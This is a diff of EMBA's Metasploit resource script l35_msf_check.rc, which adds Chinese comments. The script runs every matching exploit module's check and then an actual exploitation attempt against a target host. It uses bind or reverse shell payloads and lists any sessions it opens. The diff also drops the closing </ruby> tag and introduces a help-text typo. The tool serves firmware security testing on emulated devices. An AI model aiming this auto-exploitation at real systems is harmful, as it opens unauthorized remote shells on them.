@@ -1,14 +1,27 @@
 <ruby>
 
+# ============================================================#
+# Metasploit RC脚本：l35_msf_check.rc                  #
+# 功能：自动化Metasploit漏洞检查和利用                #
+# 用途：作为EMBA的一部分，对仿真系统进行自动化  #
+#       漏洞检测和利用尝试                          #
+# 注意：此脚本可能破坏仿真系统，建议在分析结束时使用  #
+# ============================================================#
+
+# ============================================================#
+# 函数：help_me                                     #
+# 功能：显示脚本的帮助信息和使用方法                    #
+# ============================================================#
 def help_me
+  # 定义帮助信息
   help = %Q|
   Description:
-    This Metasploit RC script is part of the firmware analyzer EMBA.
+    This Metasploit RC script is part of firmware analyzer EMBA.
     The script runs through all Metasploit modules and triggers the check function.
-    As the check functionality is not implemented in all modules we also do
+    As check functionality is not implemented in all modules we also do
     a real exploitation attempt. This could corrupt our emulated system. This EMBA
     module is typically used at the end of the automated analysis procedure.
-    You can also setup the emulated device afterwards manually and check the 
+    You can also setup the emulated device afterwards manually and check's
     Metasploit RC script against it with the following arguments.
 
   Usage:
@@ -16,16 +29,26 @@ def help_me
     ./msfconsole -r ./helpers/l35_msf_check.rc 127.0.0.1 123,1337,101 mipsle
   |
 
+  # 清理帮助信息的格式
   help = help.gsub(/^\s+/, '')
+  # 打印帮助信息
   print_line(help)
 end
 
+# 存储所有任务ID的数组
 @job_ids = []
 
+# ============================================================#
+# 函数：wait_until_jobs_done                        #
+# 功能：等待所有后台任务完成                          #
+# ============================================================#
 def wait_until_jobs_done
   loop do
+    # 遍历所有任务ID
     @job_ids.each do |job_id|
+      # 获取当前活动任务ID列表
       current_job_ids = framework.jobs.keys.map { |e| e.to_i }
+      # 如果任务仍在运行，等待1秒
       sleep 1 if current_job_ids.include?(job_id)
     end
 
@@ -33,7 +56,14 @@ def wait_until_jobs_done
   end
 end
 
+# ============================================================#
+# 函数：select_payload                                #
+# 功能：根据架构选择合适的负载（payload）              #
+# 参数：exploit - 利用模块，architecture - 目标架构        #
+# 返回：选择的负载字符串                              #
+# ============================================================#
 def select_payload(exploit, arch)
+  # 定义不同架构的负载
   linux   = "linux/#{arch}/shell_bind_tcp"
   php     = 'php/meterpreter/bind_tcp'
   multi   = 'java/meterpreter/bind_tcp'
@@ -41,11 +71,13 @@ def select_payload(exploit, arch)
   # generic = 'generic/shell_bind_tcp'
   generic = 'generic/shell_reverse_tcp'
 
+  # 获取利用模块兼容的所有负载
   payloads = []
   exploit.compatible_payloads.each do |p|
     payloads << p[0]
   end
 
+  # 根据兼容性选择负载
   if payloads.include?(linux)
     return linux
   elsif payloads.include?(php)
@@ -57,32 +89,40 @@ def select_payload(exploit, arch)
   elsif payloads.include?(generic)
     return generic
   else
-    # This exploit does not support any of the preferred payloads. Falling back to default linux payload:
+    # 如果利用模块不支持任何首选负载，回退到默认Linux负载
     return linux
   end
 end
 
+# ============================================================#
+# 函数：exploit_checker                               #
+# 功能：检查和利用目标主机上的漏洞                     #
+# 参数：host - 目标主机IP，ports - 端口列表，architecture - 架构 #
+# ============================================================#
 def exploit_checker(host, ports, architecture)
   print_status("Checking host #{host} with identified ports #{ports}...")
+  # 遍历所有利用模块
   framework.exploits.each { |name,mod|
+    # 创建利用模块实例
     mod = framework.modules.create("#{name}")
 
+    # 检查模块是否成功加载
     if mod.nil?
       print_line("Unable to load #{name}")
       next
     end
 
-    # remove modules that we won't check:
+    # 排除不需要检查的模块类型
     next if (name =~ /local/ or
              name =~ /fileformat/ or
              name =~ /browser/)
-    # only test modules from the following categories:
+    # 只检查特定类别的模块
     next if not (name =~ /linux/ or
                  name =~ /multi/ or
                  name =~ /freebsd/ or
                  name =~ /unix/ or
                  name =~ /openbsd/)
-    # remove modules with issues - we need to check them again and adjust the settings:
+    # 排除已知有问题的模块
     next if (name =~ /cve_2020_13160_anydesk/ or
              name =~ /goahead_ldpreload/ or
              name =~ /phpmailer_arg_injection/ or
@@ -90,43 +130,50 @@ def exploit_checker(host, ports, architecture)
              name =~ /netgear_telnetenable/ or
              name =~ /atutor_filemanager_traversal/)
 
+    # 遍历每个端口
     ports.split(",").each { |serv|
-      # we test only matching ports - default RPORT of module matches
-      # open port we identified in emulation phase
+      # 只测试匹配的端口 - 模块的默认RPORT必须匹配我们在仿真阶段识别的开放端口
       next if (mod.datastore['RPORT'].to_s != serv.to_s)
 
+      # 设置模块参数
       mod.datastore['VERBOSE'] = "true"
       mod.datastore['RHOSTS'] = host.to_s
       mod.datastore['SRVHOST'] = Rex::Socket.source_address("#{host.to_s}") 
 
+      # 针对MIPS架构的特殊处理
       if architecture == "mipsbe"
-        # mipsbe is mostly target 1
+        # mipsbe通常是目标1
         mod.datastore['TARGET'] = 1
       end
       if architecture == "mipsle"
-        # mipsle is mostly target 0
+        # mipsle通常是目标0
         mod.datastore['TARGET'] = 0
       end
 
+      # 打印检查状态
       print_status("Checking #{name} against host #{host.to_s}:#{serv} ...")
       begin
-        # Vuln check:
+        # 漏洞检查：
         result = mod.check_simple({'RunAsJob': true, 'LocalOutput': self.output})
 
+        # 记录任务ID
         if mod.job_id
           print_status("Check #{name} job ID for target #{host.to_s} is: #{mod.job_id}")
           @job_ids << mod.job_id
         end
 
+        # 打印检查结果
         if not result.nil?
           print_status("Check code for #{name}: #{result.to_s}")
         end
 
+        # 如果发现漏洞，打印成功消息
         if (result.to_s =~ /Vulnerable/ or result.to_s =~ /Appears/)
           print_good("Vulnerability identified for module #{name} - #{host.to_s}:#{serv}")
           print_good("Check state #{result} for module #{name} - #{host.to_s}:#{serv}")
         end
 
+        # 如果检查结果为安全，跳过利用尝试
         if (result.to_s =~ /safe/)
           print_status("Check code is safe - skipping exploitation attempt for #{name}")
           next
@@ -135,10 +182,13 @@ def exploit_checker(host, ports, architecture)
         print_error(e.message)
       end
 
+      # 打印利用状态
       print_status("Exploiting #{name} against host #{host.to_s}:#{serv} ...")
+      # 选择合适的负载
       get_payload = select_payload(mod,architecture)
       mod.datastore['RHOST'] = host.to_s
 
+      # 检查是否成功选择负载
       if get_payload.nil?
         print_error("No payload selected for this exploit: #{name}")
       else
@@ -146,22 +196,24 @@ def exploit_checker(host, ports, architecture)
       end
 
       begin
-        # max lport 40862:
+        # 设置随机本地端口（最大40862）
         lport_setting = rand(4000..40_862).to_s
         mod.datastore['LPORT'] = lport_setting
+        # 如果是反向连接负载，设置本地主机地址
         if get_payload.to_s =~ /reverse/
           mod.datastore['LHOST'] = Rex::Socket.source_address("#{host.to_s}") 
         end
         mod.datastore['PAYLOAD'] = get_payload.to_s
 
-        # Exploitation:
+        # 利用尝试：
         result = mod.exploit_simple({'RunAsJob': true, 'LocalOutput': self.output})
 
-        # looks like the job handling does not work as expected - mod.job_id is empty
+        # 任务处理似乎不像预期那样工作 - mod.job_id为空
         if mod.job_id
           print_status("Exploit #{name} job ID for target #{host.to_s} is: #{mod.job_id}")
           @job_ids << mod.job_id
         end
+        # 如果成功建立会话，打印成功消息
         if (result.to_s =~ /Sessions/)
           print_good("Vulnerability identified for module #{name} - #{host.to_s}:#{serv}")
           print_good("Session state #{result} for module #{name} - #{host.to_s}:#{serv}")
@@ -171,29 +223,36 @@ def exploit_checker(host, ports, architecture)
       end
     }
   }
+  # 等待所有任务完成
   print_status("All exploits sent to #{host} ... lets wait a few seconds")
   wait_until_jobs_done
 end
 
 
-#
-# Initialize our arguments
-#
+# ============================================================#
+# 函数：init_args                                    #
+# 功能：初始化并验证命令行参数                      #
+# 返回：包含host、ports、architecture的哈希表            #
+# ============================================================#
 def init_args
   args = {}
+  # 检查是否请求帮助
   if ARGV.join('') =~ /^help$/i
     args[:help] = true
     return args
   end
 
+  # 从命令行参数中提取信息
   datastore        = framework.datastore
   args[:host]      = ARGV.shift || ''
   args[:ports]     = ARGV.shift || ''
   args[:architecture]      = ARGV.shift || ''
 
+  # 验证必需参数
   raise ArgumentError, "Missing a host ip address" if args[:host].empty?
   raise ArgumentError, "Missing port list" if args[:ports].empty?
 
+  # 打印参数信息
   print_status("Ports: #{args[:ports]}")
   print_status("Host: #{args[:host]}")
   print_status("ARCH: #{args[:architecture]}")
@@ -202,33 +261,38 @@ def init_args
 end
 
 
-#
-# main
-#
+# ============================================================#
+# 主程序                                            #
+# ============================================================#
 print_status("Starting Metasploit analysis ...")
 begin
+  # 初始化参数
   args = init_args
+  # 如果请求帮助，显示帮助信息并退出
   if args[:help]
     help_me
     return
   end
 
+  # 执行漏洞检查器
   exploit_checker(args[:host],args[:ports],args[:architecture])
-  # future extension:
+  # 未来扩展：
   # auxiliary_checker(args[:host],args[:ports],args[:arch])
 rescue ArgumentError => e
   print_error("Invalid argument: #{e.message}")
   return
 end
 
-# we give the exploit another 30 seconds before we exit Metasploit the hard way
+# 给利用尝试额外30秒时间
 sleep 30
+# 打印完成状态和会话数量
 print_status("The autoexploitation attempt has completed with #{framework.sessions.length} sessions")
+# 如果有活动会话，显示详细信息
 unless framework.sessions.empty?
   run_single("sessions -v")
 end
 
+# 清理：终止所有任务
 run_single("jobs -K")
+# 退出Metasploit
 run_single("exit -y")
-
-</ruby>
